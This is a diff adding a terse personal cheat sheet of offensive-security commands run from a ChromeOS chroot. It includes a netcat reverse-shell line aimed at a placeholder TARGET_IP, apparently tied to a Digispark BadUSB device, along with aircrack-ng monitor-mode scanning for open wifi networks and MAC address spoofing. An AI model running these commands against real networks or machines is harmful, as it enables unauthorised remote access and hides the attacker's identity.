@@ -1,0 +1,27 @@
+start the goooood terminal in ChromeOS:
+shell
+sudo enter-chroot
+
+OR
+sudo startxfce4
+
+start netcat reverse shell:
+nc TARGET_IP PORT(100 for the digispark one)
+
+show cards:
+ip a
+
+mon mode:
+sudo airmon-ng start CardName
+
+search networks:
+sudo airodump-ng wlan0mon -c CHANNEL --encrypt OPN -a
+
+get out of mon mode:
+sudo airmon-ng stop wlan0mon
+
+change mac: (-r does random)
+sudo macchanger -m TheNewMACaddress TheNameOfTheInterface
+
+bring card back up:
+sudo ifconfig wlan0 up
